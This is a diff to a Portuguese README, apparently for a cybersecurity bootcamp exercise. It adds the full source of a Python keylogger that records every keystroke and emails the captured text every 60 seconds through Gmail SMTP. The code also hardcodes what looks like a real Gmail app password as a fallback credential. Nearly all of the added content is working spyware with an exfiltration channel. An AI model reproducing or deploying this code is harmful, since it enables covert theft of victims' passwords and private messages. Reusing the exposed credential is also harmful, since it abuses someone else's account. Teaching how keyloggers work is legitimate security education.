@@ -17,7 +17,7 @@ Repositório desenvolvido para o desafio prático de cibersegurança do bootcamp
 
 ---
 
-## 💻 Código do Keylogger (`keylogger_simulado.py`)
+## 💻 Código do Keylogger (`keylogger.py`)
 
 ```python
 from pynput import keyboard
@@ -61,3 +61,63 @@ def on_press(key):
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+```
+## 💻 Código de envio do keylogger por email (`keylogger_email.py`)
+
+```python
+import os
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+from pynput import keyboard
+
+log = ""
+
+EMAIL_ORIGEM = "cyber.multitools@gmail.com"
+EMAIL_DESTINO = "cyber.multitools@gmail.com"
+SENHA_EMAIL = os.getenv("SENHA_EMAIL", "tmze ltte gyeq ewrh")
+
+
+def enviar_email():
+    global log
+
+    try:
+        if log:
+            conteudo = log
+            log = ""
+
+            msg = MIMEText(conteudo)
+            msg["Subject"] = "Dados capturados pelo Keylogger"
+            msg["From"] = EMAIL_ORIGEM
+            msg["To"] = EMAIL_DESTINO
+
+            with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as server:
+                server.ehlo()
+                server.starttls()
+                server.ehlo()
+                server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+                server.send_message(msg)
+    except Exception as e:
+        print("Erro ao enviar:", repr(e))
+    finally:
+        Timer(60, enviar_email).start()
+
+
+def on_press(key):
+    global log
+    try:
+        if key.char is not None:
+            log += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.backspace:
+            log += "[<]"
+
+
+with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()
+    listener.join()
+```
